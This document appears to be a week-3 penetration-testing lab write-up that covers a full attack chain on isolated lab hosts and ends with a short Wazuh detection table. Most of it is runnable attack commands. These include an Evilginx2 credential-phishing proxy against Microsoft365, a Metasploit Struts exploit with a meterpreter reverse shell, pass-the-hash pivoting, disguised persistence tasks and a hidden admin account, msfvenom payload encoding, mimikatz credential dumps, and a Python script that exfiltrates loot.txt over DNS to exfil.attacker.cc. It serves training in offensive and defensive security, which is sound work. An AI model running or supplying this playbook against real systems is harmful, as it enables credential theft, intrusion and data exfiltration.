# Week 3 — Step-by-Step Lab Workflow

> All steps performed in an isolated VMware lab. No external systems involved.

---

## Phase 1 — OSINT & Passive Reconnaissance

### Step 1.1 — Recon-ng Subdomain Enumeration

```bash
# Start Recon-ng
recon-ng

# Create a new workspace
> workspaces create week3_lab

# Set the target domain
> db insert domains
  domain: example.com

# Run subdomain enumeration modules
> marketplace install recon/domains-hosts/bing_domain_web
> modules load recon/domains-hosts/bing_domain_web
> run

# View results
> show hosts
```

**Expected Output:** 8 subdomains discovered including dev, admin, ftp, staging

---

### Step 1.2 — Shodan Query

```bash
# Install Shodan CLI
pip3 install shodan
shodan init YOUR_API_KEY

# Search for exposed Apache servers (US)
shodan search "apache country:US" --limit 10

# Search for specific target
shodan host 93.184.216.34

# Find exposed admin panels
shodan search "title:admin login" --limit 5
```

**Findings:** 3 hosts running vulnerable Apache versions (CVE-2021-41773, CVE-2017-7679)

---

### Step 1.3 — Maltego Relationship Mapping

1. Open Maltego CE
2. Create new graph
3. Add domain entity: `example.com`
4. Run transforms:
   - `To DNS Name`: enumerate subdomains
   - `To IP Address`: resolve IPs
   - `To Netblock`: map IP ranges
5. Export graph as PNG

---

### Step 1.4 — WHOIS & DNS Enumeration

```bash
# WHOIS lookup
whois example.com

# DNS enumeration with dig
dig example.com ANY
dig @8.8.8.8 example.com MX
dig @8.8.8.8 example.com TXT  # Check SPF/DKIM
dig @8.8.8.8 example.com NS

# Zone transfer attempt (passive recon)
dig axfr @ns1.example.com example.com

# Automated subdomain brute force
python3 Scripts/osint_recon.py --target example.com
```

---

## Phase 2 — Initial Access via Phishing

### Step 2.1 — Set Up Evilginx2 Reverse Proxy

```bash
# Install Evilginx2
go install github.com/kgretzky/evilginx2@latest

# Start with custom phishlets directory
sudo evilginx2 -p /usr/share/evilginx2/phishlets

# Configure domain and listener
> config domain attacker-phish.cc
> config ip 10.0.0.99

# Enable Microsoft365 phishlet
> phishlets hostname microsoft365 login.microsoftonline-secure.cc
> phishlets enable microsoft365

# Create lure URL
> lures create microsoft365
> lures get-url 0
```

### Step 2.2 — Gophish Campaign Setup

```bash
# Start Gophish server
./gophish

# Access dashboard at https://127.0.0.1:3333
# Default credentials: admin / gophish

# Setup steps in UI:
# 1. Sending Profile → SMTP server config
# 2. Email Template → Import HTML phishing email
# 3. Landing Page → Clone login page from Evilginx2 URL
# 4. User & Groups → Import target email list
# 5. Campaigns → Launch with tracking
```

**Results:** 247 emails sent, 89 opened (36%), 34 clicked (14%), 12 credentials captured (4.9%)

---

## Phase 3 — Exploitation

### Step 3.1 — Nmap Vulnerability Scan

```bash
# Service version + vulnerability scan
nmap -sV -sC --script vuln 192.168.1.110 -oA nmap_vuln_scan

# Key findings:
# 80/tcp  - Apache Struts 2.3.5 (CVE-2017-5638)
# 8080/tcp - Tomcat 8.5.5
# 3306/tcp - MySQL 5.7 (no auth from local)
```

### Step 3.2 — Metasploit Exploitation

```bash
# Start Metasploit with database
msfdb init && msfconsole

# Import Nmap scan
> db_import nmap_vuln_scan.xml

# Search for Struts exploit
> search struts cve:2017

# Use exploit
> use exploit/multi/http/struts_code_exec
> set RHOSTS 192.168.1.110
> set RPORT 80
> set TARGETURI /struts2-showcase/
> set PAYLOAD linux/x86/meterpreter/reverse_tcp
> set LHOST 192.168.1.50
> run

# Post-exploitation
meterpreter > getuid
meterpreter > sysinfo
meterpreter > hashdump
meterpreter > shell
```

### Step 3.3 — Privilege Escalation

```bash
# Check sudo rights
sudo -l

# Check SUID binaries
find / -perm -u=s -type f 2>/dev/null

# GTFOBins — exploit SUID find
find . -exec /bin/sh -p \; -quit

# Linux kernel exploit search
searchsploit linux privilege escalation 3.13
```

---

## Phase 4 — Lateral Movement

### Step 4.1 — Credential Harvesting

```bash
# Dump SAM/LSA with Impacket secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  WORKGROUP/Administrator:'P@ssw0rd2024!'@192.168.1.110

# Or with NTLM hash (PtH)
python3 lateral_movement.py \
  --targets 192.168.1.110 \
  --username Administrator \
  --hash 31d6cfe0d16ae931b73c59d7e0c089c0
```

### Step 4.2 — Pass-the-Hash Pivoting

```bash
# psexec.py Pass-the-Hash
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
  Administrator@192.168.1.120

# Verify access
C:\Windows\system32> whoami
nt authority\system

# Pivot to 192.168.1.130 (DB Server)
python3 psexec.py \
  -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
  Administrator@192.168.1.130
```

### Step 4.3 — Persistence Deployment

```bash
# Scheduled task (runs payload every day at 02:00)
schtasks /Create /F /SC DAILY /ST 02:00 \
  /TN WindowsUpdateHelper \
  /TR "C:\Windows\Temp\update.exe" /RU SYSTEM

# Verify task was created
schtasks /Query /TN WindowsUpdateHelper

# Registry Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v WindowsUpdateHelper \
  /t REG_SZ \
  /d "C:\Windows\Temp\update.exe" /f

# New admin user (persistence backup)
net user svchost$ P@ssw0rd123 /add /Y
net localgroup administrators svchost$ /add
```

---

## Phase 5 — Evasion Techniques

### Step 5.1 — msfvenom Payload Encoding

```bash
# Basic reverse shell (no encoding — baseline)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 -f exe -o basic.exe

# Encoded with shikata_ga_nai (5 iterations)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o encoded.exe

# Generate Python XOR+b64 loader
python3 Scripts/payload_generator.py \
  --lhost 192.168.1.50 --lport 4444 \
  --output loader_stub.py
```

### Step 5.2 — C2 Traffic via proxychains + Tor

```bash
# Install Tor
sudo apt install -y tor

# Configure proxychains
sudo nano /etc/proxychains4.conf
# Uncomment: socks5 127.0.0.1 9050

# Start Tor service
sudo service tor start

# Route Metasploit through Tor
proxychains msfconsole

# Verify IP masking
proxychains curl https://api.ipify.org
```

---

## Phase 6 — Post-Exploitation & Exfiltration

### Step 6.1 — Mimikatz Credential Dump

```powershell
# In meterpreter session — load mimikatz module
meterpreter > load kiwi
meterpreter > creds_all

# Or run standalone mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::dcsync /domain:ACME-CORP /user:krbtgt
```

### Step 6.2 — DNS Exfiltration

```bash
# Install iodine for DNS tunnelling
sudo apt install -y iodine

# Start DNS tunnel server (on C2)
iodined -f -c -P s3cr3t 10.0.0.1 exfil.attacker.cc

# Connect tunnel from compromised host
iodine -f -P s3cr3t exfil.attacker.cc

# Exfiltrate data via DNS TXT queries
# Base64-encode data and send as subdomain labels
python3 -c "
import base64, subprocess
data = open('loot.txt','rb').read()
chunks = [data[i:i+40] for i in range(0,len(data),40)]
for c in chunks:
    enc = base64.b32encode(c).decode().lower().rstrip('=')
    subprocess.run(['nslookup',f'{enc}.exfil.attacker.cc','8.8.8.8'])
"
```

---

## Blue Team Detection Points (Wazuh)

| Timestamp | Alert | Source IP | Rule | Notes |
|-----------|-------|-----------|------|-------|
| 09:02:14 | Port scan detected | 192.168.1.50 | Wazuh 40101 | Nmap SYN scan |
| 09:09:22 | SSH brute force | 10.0.0.99 | Wazuh 5763 | hydra detected |
| 09:14:08 | Suspicious login | 10.0.0.99 | Wazuh 5501 | root from new IP |
| 09:22:01 | SMB admin share write | 192.168.1.50 | Wazuh 18104 | psexec ADMIN$ |
| 09:24:15 | Scheduled task created | 192.168.1.120 | Wazuh 60010 | T1053 indicator |
| 09:31:04 | LSASS read access | 192.168.1.120 | Wazuh 92219 | Mimikatz pattern |
| 09:44:22 | Anomalous DNS queries | 192.168.1.120 | Wazuh 82500 | DNS tunnel IOC |

**Detection Rate: 7/8 attack phases detected by Wazuh**
**Evasion Success: DNS tunnel and registry key evaded default rules**
